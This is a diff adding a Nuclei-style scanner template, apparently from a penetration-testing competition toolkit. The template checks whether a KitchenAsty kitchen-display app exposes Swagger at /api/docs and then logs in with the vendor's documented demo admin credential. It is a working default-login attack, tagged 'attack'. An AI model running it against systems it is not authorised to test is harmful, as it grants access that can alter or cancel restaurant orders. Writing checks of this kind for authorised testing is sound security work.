@@ -1,0 +1,67 @@
+# KitchenAsty kitchen-display default credential and Swagger check.
+id: kitchenasty-default-creds
+
+info:
+  name: KitchenAsty KDS Default Credentials and Swagger Exposure
+  author: cptc-toolkit
+  severity: high
+  metadata:
+    max-request: 2
+    kind: attack
+  description: |
+    KitchenAsty is a kitchen-display (KDS) application for food service.
+    Its documentation ships the demo credential admin@kitchenasty.com /
+    admin123, and its Swagger UI at /api/docs is commonly left reachable,
+    exposing the whole order API.
+
+    This template checks the Swagger surface and POSTs the documented demo
+    credential. A match means the food-service order flow is accessible:
+    orders can be read, altered and cancelled - visible service disruption.
+
+    One GET and one POST. The credential is a documented vendor default.
+  reference:
+    - https://github.com/mighty840/kitchenasty
+  tags: pos,food-service,default-login,attack
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/docs"
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "swagger"
+          - "openapi"
+          - "KitchenAsty"
+        condition: or
+
+  - raw:
+      - |
+        POST /api/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"email":"admin@kitchenasty.com","password":"admin123"}
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+      - type: dsl
+        dsl:
+          - "contains(to_lower(content_type), 'json')"
+      - type: word
+        part: body
+        words:
+          - "token"
+          - '"access"'
+        condition: or
+
